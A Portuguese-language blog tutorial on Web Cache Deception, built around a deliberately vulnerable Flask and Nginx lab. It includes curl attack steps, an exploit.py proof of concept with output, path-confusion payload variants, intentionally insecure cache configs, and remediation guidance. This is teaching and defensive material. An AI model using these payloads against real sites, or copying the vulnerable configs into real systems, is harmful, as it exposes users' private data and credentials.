---
title: "Web Cache Deception na Prática: Quando o Cache Entrega os Dados de Outra Pessoa (PT-BR)"
published: true
tags: [web-security, web-cache-deception, appsec, cache, pt-br]
---

## Introdução

Tem uma classe de vulnerabilidade que eu acho especialmente elegante, e Web Cache Deception é uma delas. Não tem buffer estourando, não tem shellcode, não tem nada de baixo nível. É puro mal-entendido. Duas peças de infraestrutura, um cache e um backend, olham para a mesma URL e enxergam coisas diferentes. Esse desacordo de interpretação, sozinho, é suficiente para fazer o servidor guardar a página privada de uma vítima num lugar onde qualquer pessoa pode pegar.

Eu trabalho com segurança na parte web no dia a dia, e o que me fascina nesse tipo de bug é que ele não exige nenhuma falha de código no sentido tradicional. O backend pode estar "correto". O cache pode estar "correto". Cada um, isoladamente, faz exatamente o que foi configurado para fazer. A vulnerabilidade nasce no espaço entre os dois, na fronteira onde uma string de URL é interpretada de dois jeitos incompatíveis. É o tipo de coisa que te ensina a desconfiar de toda fronteira de sistema, e isso muda a forma como você revisa arquitetura.

A técnica foi apresentada de forma estruturada por Omer Gil em 2017, com uma demonstração que ficou famosa contra o PayPal. De lá pra cá ela voltou a aparecer em alvos grandes (inclusive em incidentes recentes envolvendo aplicações de IA), o que mostra que o problema não envelheceu. Cache continua sendo cache, e gente continua colocando dados dinâmicos atrás dele sem pensar nas implicações.

Para este artigo eu montei um laboratório reproduzível, com Nginx na frente e Flask atrás, propositalmente vulnerável. Todo o código está no repositório:

```
https://github.com/renansj/web-cache-deception-lab
```

A ideia aqui é a mesma de sempre: não ficar na superfície. Vamos entender o porquê de cada peça, ler o código vulnerável linha a linha, explorar na mão com `curl`, depois automatizar, e por fim discutir variantes, detecção e remediação de verdade.

### Para quem é este artigo?

* Pessoas de AppSec e pentest que querem dominar a técnica, não só citá-la
* Quem desenvolve e quer entender como uma config de cache "inofensiva" vira vazamento
* Quem está estudando para certificações ofensivas com foco em web
* Curiosos que gostam de entender vulnerabilidades de arquitetura, não só de código

### Pré-requisitos

* Noção de HTTP (métodos, headers, cookies, status codes)
* Familiaridade básica com proxy reverso e com o conceito de cache
* Um Linux com Docker, ou com Nginx e Python instalados

### Ambiente de laboratório

O lab roda de duas formas, e as duas sobem o alvo em `http://localhost:8080`:

```bash
# Opção 1: local (Nginx + Flask)
sudo apt install nginx
pip3 install flask
./setup.sh start

# Opção 2: Docker (recomendado, isola tudo)
docker-compose up -d
```

Para acompanhar, você só precisa de um navegador, do `curl` e de um editor para ler os arquivos. Recomendo deixar um terminal aberto observando o header `X-Cache-Status`, porque ele é o nosso oráculo durante todo o ataque.

---

## 1. O que é Web Cache Deception

Web Cache Deception (WCD) é uma técnica em que o atacante engana um cache intermediário (um CDN, um proxy reverso, uma camada de edge) para que ele armazene uma resposta que contém dados sensíveis de outro usuário. Depois, o atacante simplesmente pede de novo aquela mesma URL e recebe os dados da vítima diretamente do cache, sem precisar de autenticação nenhuma.

Repare na inversão de papéis em relação ao que normalmente esperamos de um cache. Cache existe para servir conteúdo público e repetitivo (uma folha de estilo, uma imagem, um script) de forma rápida e barata. O problema começa quando o cache, por engano, guarda algo que era privado e personalizado, como a página "Minha Conta" de um usuário logado. A partir daí o cache deixou de ser otimização e virou um repositório público de dados privados.

A frase que resume tudo: o atacante não invade o backend, ele convence o cache a guardar a coisa errada.

### Os três ingredientes

Para que o ataque funcione, três condições precisam existir ao mesmo tempo. Decore essas três, porque toda a exploração e toda a defesa giram em torno delas:

1. O cache decide o que cachear olhando a extensão da URL (`.css`, `.js`, `.png`, e por aí vai).
2. O backend ignora o sufixo extra da URL e resolve a rota assim mesmo, retornando conteúdo dinâmico e autenticado (isso é path normalization, ou permissive routing).
3. A resposta sensível não vem com headers de cache que proíbam o armazenamento (falta um `Cache-Control: no-store, private`), ou o cache simplesmente ignora esses headers.

Quando os três se alinham, uma URL como `/account/qualquercoisa.css` faz o cache pensar "isso é um arquivo estático, vou guardar", enquanto o backend pensa "isso é `/account`, vou devolver os dados da conta". O resultado é uma página privada cacheada sob um nome de arquivo aparentemente inofensivo.

---

## 2. Cache Deception não é Cache Poisoning

Esses dois nomes confundem muita gente, e a distinção é importante porque os vetores, as vítimas e os impactos são diferentes. O README do lab traz a comparação direta, que reproduzo aqui:

| | Cache Deception | Cache Poisoning |
|---|---|---|
| Quem acessa a URL maliciosa? | A vítima | O atacante |
| O que é cacheado? | Resposta legítima com dados da vítima | Resposta manipulada pelo atacante |
| Vetor | Induzir a vítima a clicar em um link | Manipular headers ou parâmetros que entram na cache key |
| Resultado | Atacante lê dados privados do cache | Todos os usuários recebem conteúdo malicioso |

Em uma frase: no Cache Poisoning o atacante envenena o cache para atacar os outros; no Cache Deception o atacante faz a vítima envenenar o cache em favor dele. Em Deception, quem "polui" o cache é a própria vítima autenticada, ao acessar o link preparado. O atacante apenas colhe depois.

---

## 3. Como um cache decide o que guardar

Para enganar o cache, primeiro a gente precisa entender como ele pensa. Um proxy de cache trabalha com dois conceitos centrais:

* Cache key: o "fingerprint" da requisição, usada para arquivar e recuperar respostas. Tipicamente é algo como esquema + método + host + path. Duas requisições com a mesma key são consideradas "a mesma coisa" pelo cache.
* Cacheability: a decisão de "isso pode ou não ser guardado". Em um mundo ideal, essa decisão respeita o que o backend manda nos headers (`Cache-Control`, `Vary`, `Set-Cookie`). No mundo real, muita configuração toma atalhos.

O atalho perigoso é decidir cacheability pela extensão da URL. A lógica do administrador costuma ser inocente: "arquivos `.css` e `.js` são estáticos, então vou cachear tudo que termina nessas extensões e aliviar o backend". O problema é que essa regra confia na extensão como se ela fosse a verdade sobre o conteúdo, quando ela é apenas um pedaço de string que o atacante controla.

E aqui mora a outra metade do bug. A cache key normalmente inclui o path inteiro. Então `/account/leak.css` e `/account` são keys diferentes. O cache nunca "sabe" que aquilo na verdade era a página `/account`. Para ele, `/account/leak.css` é um arquivo estático novo e original, que merece ser guardado. O backend, por sua vez, descarta o `/leak.css` e serve `/account`. As duas visões nunca se encontram, e é exatamente nessa divergência que o ataque vive.

---

## 4. Anatomia do ataque

Antes de sujar as mãos, vale fixar o fluxo completo. Este diagrama é o do próprio repositório e mostra as duas fases (vítima envenenando, atacante colhendo):

```
Vítima (autenticada) ──→ GET /account/x.css ──→ Nginx (cache)
                                                    │
                                    "extensão .css → cachear!"
                                                    │
                                                    ▼
                                              Flask (backend)
                                              resolve /account
                                              retorna dados sensíveis
                                                    │
                                                    ▼
                                          Nginx armazena no cache
                                          key: /account/x.css

Atacante (não autenticado) ──→ GET /account/x.css ──→ Nginx
                                                        │
                                              cache HIT → retorna
                                              dados da vítima
```

E os pré-requisitos práticos para o ataque acontecer, também listados no lab:

1. Um cache intermediário que decide cachear por extensão de URL.
2. Um backend que ignora segmentos de path extras (path normalization).
3. Ausência de `Cache-Control: no-store, private` nas respostas sensíveis.
4. A vítima precisa acessar a URL preparada, o que exige interação (phishing, uma tag `img` em um fórum, um link no chat, etc.).

Esse quarto ponto é importante para calibrar o impacto. WCD exige interação da vítima. Isso não o torna fraco, mas significa que o atacante precisa de um gatilho social, e isso aparece no cálculo de severidade mais adiante.

---

## 5. Dissecando o backend vulnerável (`app.py`)

Vamos ler o backend do lab. É um Flask minúsculo que simula uma aplicação com login e uma área autenticada. Comecei pelos dados sensíveis e pela rota que os entrega:

```python
USERS = {
    "admin":  {"password": "admin123",  "email": "admin@corp.internal",
               "api_key": "sk-PROD-4f8a2b1c9d3e7f6a", "role": "administrator"},
    "victim": {"password": "victim123", "email": "victim@corp.internal",
               "api_key": "sk-PROD-9x8y7z6w5v4u3t2s", "role": "user"},
}

@app.route("/account")
@app.route("/account/<path:subpath>")
def account(subpath=None):
    """Endpoint sensível: retorna dados privados do usuário autenticado."""
    if "user" not in session:
        return "Não autenticado", 401
    u = USERS[session["user"]]
    resp = make_response(f"""
        <h1>Minha Conta</h1>
        <p><b>Usuário:</b> {session['user']}</p>
        <p><b>Email:</b> {u['email']}</p>
        <p><b>API Key:</b> {u['api_key']}</p>
        <p><b>Role:</b> {u['role']}</p>
    """)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers.pop("Vary", None)
    return resp
```

Tem duas decisões aqui que, juntas, abrem a porta. A primeira é o roteamento. Repare nas duas anotações de rota empilhadas:

```python
@app.route("/account")
@app.route("/account/<path:subpath>")
```

A segunda rota, com o conversor `<path:subpath>`, faz com que qualquer coisa depois de `/account/` seja capturada e jogada no parâmetro `subpath`, que o handler simplesmente ignora. Ou seja: `/account/leak.css`, `/account/qualquer/coisa.js`, `/account/foo.png`, tudo cai no mesmo handler e devolve os mesmos dados sensíveis. Esse é o comportamento de "path normalization" do lado do backend, o ingrediente número 2 da nossa lista. O backend trata o sufixo como decoração irrelevante.

A segunda decisão é a ausência de proteção de cache. A resposta com a API Key sai sem nenhum `Cache-Control`. Pior: o código remove explicitamente o header `Vary`:

```python
resp.headers.pop("Vary", None)

@app.after_request
def remove_vary(response):
    """Remove Vary header para simular backend vulnerável."""
    response.headers.pop("Vary", None)
    return response
```

Isso é proposital e simula um padrão real e perigoso. O Flask, por padrão, adiciona `Vary: Cookie` quando você usa sessão, e esse header é justamente uma das defesas naturais contra cache de conteúdo personalizado (ele diz ao cache "a resposta varia conforme o cookie, então não trate todo mundo igual"). Ao remover o `Vary`, o lab reproduz o cenário de um backend que confia cegamente que o proxy "não vai cachear página dinâmica", e portanto não se dá ao trabalho de avisar nada. Esse excesso de confiança é o ingrediente número 3.

Note também que existe uma rota estática de verdade:

```python
@app.route("/static/<path:filename>")
def static_file(filename):
    return f"/* static content: {filename} */", 200, {"Content-Type": "text/css"}
```

Ela serve para mostrar o contraste: existem URLs que são legitimamente estáticas e cacheáveis. O ataque consiste em fazer uma URL dinâmica se disfarçar de uma dessas.

---

## 6. Dissecando o proxy vulnerável (`nginx.conf`)

Agora o outro lado da fronteira. O Nginx do lab está configurado como proxy reverso com cache, e a regra problemática é uma `location` que casa por extensão:

```nginx
proxy_cache_path /tmp/nginx_cache levels=1:2 keys_zone=app_cache:10m max_size=100m inactive=60m;

server {
    listen 8080;
    server_name localhost;

    # Regra de cache: qualquer URL terminando em extensão estática é cacheada.
    # ESTE É O PONTO VULNERÁVEL.
    location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|pdf)$ {
        proxy_pass http://127.0.0.1:5000;
        proxy_cache app_cache;
        proxy_cache_valid 200 60m;
        proxy_cache_key "$scheme$request_method$host$request_uri";

        add_header X-Cache-Status $upstream_cache_status;
        add_header X-Cache-Key "$scheme$request_method$host$request_uri";

        proxy_set_header Host $host;
        proxy_set_header Cookie $http_cookie;
    }

    # Tudo que não é "estático" vai direto pro backend sem cache
    location / {
        proxy_pass http://127.0.0.1:5000;
        add_header X-Cache-Status "BYPASS";
    }
}
```

Tem muita coisa para destrinchar aqui, e cada linha conta uma parte da história.

A `location ~* \.(css|js|...)$` é uma regex case-insensitive que casa com qualquer URI terminando em uma daquelas extensões. Esse é o ingrediente número 1, materializado: a decisão de cache é feita puramente pelo sufixo da URL. O Nginx não pergunta ao backend se aquilo é cacheável, ele assume.

A `proxy_cache_key "$scheme$request_method$host$request_uri"` define a chave usando o `request_uri` inteiro, que inclui `/account/leak.css`. É por isso que a vítima e o atacante, pedindo exatamente a mesma URL, batem na mesma key e portanto na mesma entrada de cache. Se o atacante pedir `/account/leak.css`, ele cai no que a vítima deixou armazenado.

O `proxy_cache_valid 200 60m` diz para guardar respostas `200 OK` por 60 minutos. Como a resposta sensível do backend volta com status 200, ela é elegível. A janela de 60 minutos é o tempo que o atacante tem para colher.

O par de headers `X-Cache-Status` e `X-Cache-Key` está ali para debug, e é ouro durante a exploração. `X-Cache-Status` assume valores como `MISS` (não estava no cache, foi buscar no backend e guardou), `HIT` (servido do cache) e `BYPASS` (rota não cacheada). Ele é o nosso indicador de sucesso.

Por fim, a variante Docker (`nginx-docker.conf`) é ainda mais agressiva e vale destacar, porque representa um anti pattern que aparece no mundo real:

```nginx
# VULNERÁVEL: ignora Set-Cookie do backend (permite cachear sessões)
proxy_ignore_headers Set-Cookie Vary Cache-Control;
proxy_hide_header Set-Cookie;
proxy_hide_header Vary;
```

Aqui o proxy não só decide por extensão, ele explicitamente manda o backend calar a boca. O `proxy_ignore_headers Set-Cookie Vary Cache-Control` faz o Nginx desconsiderar exatamente os três headers que existem para impedir cache indevido. Isso simula o caso em que, mesmo que o backend tente se defender, o cache passa por cima. É um lembrete de que a defesa precisa existir nos dois lados, porque um lado sozinho pode ser anulado pelo outro.

---

## 7. Explorando na mão com `curl`

Teoria suficiente. Vamos executar o ataque manualmente primeiro, porque fazer na mão é o que de fato grava o mecanismo na cabeça. Suba o lab e siga os três passos. Cada passo corresponde exatamente a uma das fases do diagrama.

Passo 1, a vítima autentica. Em um cenário real ela já estaria logada; aqui a gente simula o login e guarda o cookie de sessão em um arquivo:

```bash
curl -s -c victim_cookies.txt \
     -d "user=victim&pass=victim123" \
     http://localhost:8080/login
```

Passo 2, a vítima (autenticada) acessa o link malicioso que o atacante enviou. Repare que a URL termina em `.css`, mas o caminho é `/account/...`. É esse clique que envenena o cache:

```bash
curl -s -b victim_cookies.txt \
     -D - -o /dev/null \
     http://localhost:8080/account/leak.css | grep -i x-cache-status
```

Saída esperada na primeira vez:

```
X-Cache-Status: MISS
```

`MISS` significa que o Nginx não tinha aquela URL no cache, então foi até o Flask, recebeu a resposta com a API Key da vítima, e, por causa da extensão `.css`, guardou tudo. A partir deste instante, a página privada da vítima está arquivada no cache sob a chave `/account/leak.css`.

Passo 3, o atacante. Sem cookie nenhum, sem autenticação nenhuma, ele pede a mesma URL:

```bash
curl -s -D - http://localhost:8080/account/leak.css | grep -iE "x-cache-status|API Key"
```

Saída esperada:

```
X-Cache-Status: HIT
        <p><b>API Key:</b> sk-PROD-9x8y7z6w5v4u3t2s</p>
```

O `HIT` confirma que a resposta veio do cache, e a API Key impressa é a da vítima (`sk-PROD-9x8y7z6w5v4u3t2s`, exatamente a do usuário `victim` no `app.py`). Um cliente anônimo acabou de ler dados privados de um usuário autenticado. Esse é o bug inteiro, em três comandos.

Vale fazer um experimento de contraste para fixar a causa raiz. Tente o mesmo ataque sem a extensão estática, pedindo `/account` diretamente como atacante:

```bash
curl -s -D - http://localhost:8080/account | grep -i x-cache-status
```

Você vai ver `X-Cache-Status: BYPASS` e um `401 Não autenticado`. Sem a extensão, a requisição cai na `location /` (não cacheada) e o backend exige sessão. É a extensão `.css`, e só ela, que muda a `location` do Nginx e destrava todo o ataque. Esse contraste prova que a vulnerabilidade está na fronteira, não em nenhum dos lados isoladamente.

---

## 8. O exploit automatizado (`exploit.py`)

Fazer na mão ensina, mas um PoC reproduzível é o que você entrega em um relatório. O repositório traz um `exploit.py` que orquestra as três fases e ainda valida o impacto automaticamente. Vou destacar as partes que importam.

O coração do exploit são as três funções que espelham o diagrama. A primeira faz o login da vítima e devolve uma sessão autenticada:

```python
def step_1_login_as_victim(target: str) -> requests.Session:
    s = requests.Session()
    r = s.post(f"{target}/login",
               data={"user": "victim", "pass": "victim123"},
               allow_redirects=False)
    if r.status_code == 302:
        print("[+] Vítima autenticada com sucesso.")
        return s
    print(f"[-] Falha no login da vítima: {r.status_code}")
    sys.exit(1)
```

A segunda simula a vítima clicando no link preparado. É aqui que o cache é envenenado, e o código já confere se o backend devolveu dados sensíveis, para garantir que a fase funcionou:

```python
def step_2_victim_accesses_poisoned_url(session, target, path):
    url = f"{target}{path}"
    r = session.get(url)
    cache_status = r.headers.get("X-Cache-Status", "N/A")
    print(f"[*] Response status: {r.status_code} | X-Cache-Status: {cache_status}")
    if "API Key" in r.text:
        print("[+] Backend retornou dados sensíveis da vítima (esperado).")
    return r
```

A terceira é o atacante. Note que ela usa `requests.get` puro, sem a sessão, ou seja, sem cookie nenhum. Um cliente totalmente anônimo:

```python
def step_3_attacker_reads_cache(target: str, path: str) -> dict:
    url = f"{target}{path}"
    time.sleep(0.5)  # garante que o cache foi escrito
    r = requests.get(url)  # sem cookies, atacante não está autenticado
    cache_status = r.headers.get("X-Cache-Status", "N/A")
    return {"status": r.status_code, "cache_status": cache_status, "body": r.text}
```

Dois detalhes de engenharia merecem atenção, porque são o tipo de coisa que separa um PoC que "funciona na minha máquina" de um que funciona sempre.

O primeiro é a geração de path aleatório:

```python
def random_path():
    """Gera path aleatório para evitar cache hit de execuções anteriores."""
    suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    return f"/account/{suffix}.css"
```

Isso evita um falso positivo sutil. Se você rodasse sempre `/account/leak.css`, a partir da segunda execução o atacante poderia receber um `HIT` de uma rodada anterior, e você não saberia se o exploit funcionou agora ou se está lendo lixo velho. Usando um sufixo novo a cada execução, cada teste é limpo. Esse cuidado com estado residual é exatamente o que se espera em teste de cache.

O segundo é a verificação de impacto, que não se contenta com o status code, ela procura o segredo específico da vítima no corpo:

```python
def verificar_impacto(resultado: dict) -> bool:
    if "sk-PROD-9x8y7z6w5v4u3t2s" in resultado["body"]:
        return True
    return False
```

Procurar pela API Key exata é mais honesto do que só checar `HIT`, porque comprova que o dado que vazou é mesmo o da vítima, e não uma página genérica qualquer. Em um relatório, é essa prova concreta que convence.

Rodando o exploit, a saída resume a história inteira:

```bash
$ python3 exploit.py --target http://localhost:8080
============================================================
 Web Cache Deception | Proof of Concept
============================================================

[*] Path envenenado: /account/qwmzlk.css

--- FASE 1: Vítima autenticada ---
[+] Vítima autenticada com sucesso.

--- FASE 2: Vítima acessa link malicioso ---
[*] Response status: 200 | X-Cache-Status: MISS
[+] Backend retornou dados sensíveis da vítima (esperado).

--- FASE 3: Atacante lê dados do cache ---
[*] Response status: 200 | X-Cache-Status: HIT

============================================================
[+] EXPLOIT CONFIRMADO: Web Cache Deception
[+] Atacante obteve dados sensíveis da vítima sem autenticação:

    <b>Email:</b> victim@corp.internal
    <b>API Key:</b> sk-PROD-9x8y7z6w5v4u3t2s
    <b>Role:</b> user

[+] Cache-Status: HIT (servido do cache)
```

A sequência `MISS` na fase 2 seguida de `HIT` na fase 3 é a assinatura do ataque. É isso que você quer ver, e é isso que você anexa no relatório como evidência.

---

## 9. Variantes de path confusion

Até agora usamos o caso mais limpo, `/account/leak.css`, que depende de o backend ter uma rota permissiva tipo `/account/<path:subpath>`. No mundo real, nem todo backend resolve `/account/leak.css` de bom grado. Muitas vezes você precisa de truques para que o backend continue resolvendo `/account` enquanto o cache continua vendo uma extensão estática. O README do lab lista as principais variantes:

```
/account/x.css              extensão estática (caso clássico)
/account%2fx.css            URL encoding
/account/..%2fstatic/x.css  path traversal normalizado
/account;x.css              path parameter (Tomcat/Java)
/account%00.css             null byte (legacy)
/account/.css               dot segment
```

Vale entender o que cada uma explora, porque a escolha depende inteiramente de como o backend e o cache normalizam URLs (e eles quase nunca normalizam igual):

* `/account/x.css` é o clássico. Funciona quando o backend ignora segmentos extras de path, como no nosso Flask.
* `/account%2fx.css` usa a barra codificada (`%2f`). Alguns caches decodificam e veem `/account/x.css`, enquanto certos backends tratam `%2f` de forma diferente, ou vice-versa. A graça é justamente o desencontro de quem decodifica o quê.
* `/account/..%2fstatic/x.css` aposta em path normalization traversal. Se o backend colapsa o `..` e resolve para algo dentro de `/account`, mas o cache enxerga a string com a extensão `.css` no fim, você ganha o desacordo.
* `/account;x.css` usa path parameters (o `;` separa parâmetros de path em servidores Java/Tomcat). O backend Tomcat pode ler isso como a rota `/account` com um parâmetro `;x.css` ignorado, enquanto o cache vê a extensão.
* `/account%00.css` é o velho null byte. Em stacks legadas, o backend trunca a string no `%00` e resolve `/account`, enquanto o cache lê a `.css` depois do byte nulo. Hoje é raro, mas aparece em sistemas antigos.
* `/account/.css` usa um dot segment. Em alguns roteadores, `/account/.css` normaliza para `/account/`, servindo a página, ao passo que o cache casa o `.css`.

A lição estratégica aqui é que WCD não é um único payload, é uma família de truques de normalização. Quando for testar um alvo de verdade, você vai iterar por essas variantes observando duas coisas a cada tentativa: o backend ainda devolveu o conteúdo sensível? E o cache marcou a resposta como cacheável? Quando as duas respostas forem sim para a mesma URL, você achou a combinação que funciona naquele alvo.

---

## 10. Por que funciona: o parser discrepancy

Se eu tivesse que resumir WCD em uma única ideia para alguém levar para casa, seria esta: a vulnerabilidade é um parser discrepancy entre duas máquinas que processam a mesma string com regras diferentes.

O cache faz uma pergunta: "essa URL parece um arquivo estático cacheável?". E responde olhando o final da string.

O backend faz outra pergunta: "que recurso essa URL identifica?". E responde olhando o começo da string, descartando o resto.

Nenhuma das duas perguntas está errada por si só. O desastre nasce porque ninguém garante que as duas respostas sejam consistentes sobre a mesma entrada. É o mesmo padrão de raiz que aparece em [request smuggling](https://renansj.dev/http-request-smuggling) (front-end e back-end discordando sobre onde uma requisição termina) e em muitos bugs de SSRF e de filtro (o validador e o consumidor interpretam a URL de formas distintas). Toda vez que dois componentes processam a mesma entrada com gramáticas diferentes, existe um espaço de exploração entre eles.

Por isso a melhor forma de caçar WCD, e de revisar arquitetura em geral, é desconfiar das fronteiras. Onde uma string troca de dono, pergunte: as duas pontas concordam exatamente sobre o que essa string significa? Se não concordam, ali tem bug, hoje ou amanhã.

---

## 11. Detecção em alvos reais

Sair do lab e achar isso na prática exige método. O roteiro que eu sigo é mais ou menos este:

1. Mapeie o que é cacheado. Identifique a infraestrutura de edge (Nginx, Varnish, Cloudflare, Akamai, Fastly) e descubra como ela decide cachear. O header `X-Cache`, `CF-Cache-Status`, `Age` e variações entregam muito. Um `Age` crescente em respostas idênticas é sinal de cache ativo.
2. Encontre endpoints sensíveis e autenticados. Páginas de conta, perfil, configurações, tokens, qualquer coisa personalizada por usuário. São esses os alvos que valem a pena ver cacheados.
3. Tente disfarçar o endpoint de estático. Pegue um endpoint sensível e adicione as variantes da seção 9. Para cada tentativa, observe se o conteúdo sensível ainda volta.
4. Confirme o cache com a assinatura MISS depois HIT. Acesse autenticado (gera `MISS` e popula o cache), depois acesse a mesma URL de outro contexto, idealmente sem cookies ou de outra sessão, e veja se vira `HIT` entregando os dados do primeiro usuário.

Um cuidado ético e operacional importante: ao testar em produção (com autorização, sempre), você pode acabar cacheando os seus próprios dados sensíveis em uma URL pública e deixá-los acessíveis por toda a janela de validade do cache. Use contas de teste descartáveis, dados fictícios, e quando possível invalide o cache depois. Não envenene o cache de produção com dados reais de usuários durante o teste.

---

## 12. Impacto e severidade

O `exploit.py` do lab já documenta a severidade no cabeçalho, e é uma classificação razoável para o caso típico:

```
CVSS 7.5 (High) | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
```

Lendo o vetor em português:

* AV:N (Network): explorável pela rede, remotamente.
* AC:L (Low): a complexidade é baixa, não depende de condições raras de corrida.
* PR:N (None): o atacante não precisa de privilégio nenhum, ataca anônimo.
* UI:R (Required): exige interação da vítima, ela precisa acessar o link preparado. É o ponto que segura a nota de subir ainda mais.
* S:U (Unchanged): o escopo não muda, fica no mesmo componente.
* C:H/I:N/A:N: impacto alto em confidencialidade, nenhum em integridade ou disponibilidade. WCD é, na essência, um vazamento de leitura.

O 7.5 reflete bem a natureza do bug: alto roubo de confidencialidade, dependente de interação. Na prática, o impacto real depende do que o endpoint expõe. Se for só um nome de usuário, o risco é menor. Se for token de sessão, API Key, ou um endpoint que reflete o cookie de autenticação no corpo, o estrago escala para account takeover completo, porque o atacante passa a colher credenciais de qualquer vítima que clicar. No nosso lab vaza uma API Key de produção, então estamos firmemente no território "isso é sério".

---

## 13. Remediação de verdade

A correção segue o princípio que o próprio ataque ensinou: como o bug vive na fronteira entre dois componentes, a defesa precisa estar nos dois lados. Confiar em um lado só é frágil, porque, como vimos no `nginx-docker.conf`, um lado pode anular o outro. O lab traz as recomendações, e eu vou aprofundá-las.

No backend, declare a intenção de cache de forma explícita e inegociável para tudo que é autenticado. Nunca presuma que o proxy vai "fazer a coisa certa":

```python
@app.after_request
def add_cache_headers(response):
    if "user" in session:
        response.headers["Cache-Control"] = "no-store, private"
    return response
```

`no-store` diz "não guarde isso em lugar nenhum" e `private` diz "isso é específico de um usuário, caches compartilhados não podem reter". Para conteúdo personalizado, esse header deveria ser automático. E, ao contrário do que o lab faz para ser vulnerável, mantenha o `Vary: Cookie`, porque ele sinaliza que a resposta depende da sessão.

No cache ou proxy, pare de cachear baseado só em extensão e passe a respeitar o backend. No Nginx, o ajuste central é não cachear quando há cookie de sessão:

```nginx
location ~* \.(css|js|png|jpg)$ {
    proxy_cache_bypass $http_cookie;   # não serve do cache se há cookie
    proxy_no_cache $http_cookie;       # não grava no cache se há cookie
    # ... resto da config
}
```

`proxy_cache_bypass` e `proxy_no_cache` ligados ao `$http_cookie` quebram exatamente o ataque: requisição com cookie de sessão deixa de ser cacheável, então a resposta da vítima nunca entra no cache para começo de conversa. E, crucialmente, nunca faça o que a config Docker do lab faz: jamais use `proxy_ignore_headers Set-Cookie Cache-Control`, porque isso joga fora as defesas que o backend tentou aplicar.

Como defense in depth, vale ainda:

* Casar cache key e cacheabilidade com base no `Content-Type` real da resposta, não na extensão da URL. Se o backend devolveu `text/html`, não trate como CSS, por mais que a URL termine em `.css`.
* Normalizar URLs de forma consistente entre edge e aplicação, eliminando o parser discrepancy na origem.
* No WAF ou na edge, bloquear ou não cachear URLs que misturam um path de aplicação conhecido (como `/account`) com extensão estática, porque essa combinação quase nunca é legítima.
* Definir o default do cache como "não cachear, a menos que explicitamente permitido", em vez de "cachear tudo que parece estático". Inverter o default é o que mais reduz risco a longo prazo.

A regra mental que eu carrego: a extensão de uma URL é entrada controlada pelo atacante, não é metadado confiável sobre o conteúdo. Qualquer decisão de segurança ou de cache baseada nela está construída sobre areia.

---

## 14. Conclusão

Web Cache Deception é, para mim, um lembrete bonito de que segurança não vive só dentro de uma função ou de um trecho de código. Ela vive também nos contratos implícitos entre sistemas, nas suposições que cada componente faz sobre o outro sem nunca verificar. O backend supôs que o proxy não cacharia página dinâmica. O proxy supôs que extensão de arquivo diz a verdade sobre o conteúdo. Cada um, sozinho, parecia razoável. Juntos, entregaram a API Key de um usuário para um anônimo qualquer.

Os conceitos centrais que valem a pena levar daqui:

* O ataque nasce de um parser discrepancy entre cache e backend sobre a mesma URL.
* Os três ingredientes são: cache por extensão, backend que ignora o sufixo, e ausência (ou anulação) de headers de cache.
* A assinatura prática é `MISS` na visita da vítima seguida de `HIT` na visita do atacante, com o dado sensível no corpo.
* A defesa tem que estar nos dois lados da fronteira, porque um lado consegue anular o outro.

Se você quer fixar isso de verdade, suba o lab, rode o `exploit.py`, e depois faça o exercício mais valioso de todos: conserte. Aplique os headers no Flask, ligue o `proxy_no_cache $http_cookie` no Nginx, e veja o `HIT` virar `MISS` ou `BYPASS`. Sentir a vulnerabilidade aparecer e depois sumir nas suas mãos é o que transforma leitura em entendimento.

O repositório está aqui, com tudo pronto para você quebrar e consertar:

```
https://github.com/renansj/web-cache-deception-lab
```

### O que vem depois?

* Web Cache Poisoning: o primo que ataca todos os usuários de uma vez, manipulando entradas não chaveadas (unkeyed inputs) que entram na resposta cacheada.
* Cache key normalization e cache key injection: explorar como a chave é construída para forçar colisões ou variações.
* [HTTP Request Smuggling](https://renansj.dev/http-request-smuggling): o mesmo padrão de raiz (dois parsers discordando) aplicado ao framing das requisições. Eu já escrevi sobre isso aqui no blog, e os dois artigos se complementam: é o mesmo parser discrepancy, só que em outro ponto da stack.
* Estudo de casos reais: a pesquisa original de Omer Gil (2017) e os relatos mais recentes de WCD em aplicações modernas, para ver a teoria batendo em alvos de verdade.

### Referências

* Omer Gil, "Web Cache Deception Attack", 2017 (pesquisa que estruturou a técnica e a demo no PayPal)
* PortSwigger Web Security Academy, material sobre Web Cache Deception e Web Cache Poisoning
* OWASP, guias de cache e de cabeçalhos de segurança HTTP
* RFC 9111 (HTTP Caching), para entender `Cache-Control`, `Vary` e as regras de armazenamento

*Artigo escrito em junho de 2026. Lab testado com Nginx e Flask, tanto em modo local quanto via Docker, com o backend e o proxy propositalmente vulneráveis para fins didáticos.*

*Se este artigo te ajudou, compartilha com a comunidade. O Brasil precisa de mais conteúdo técnico de qualidade em português sobre segurança ofensiva.*
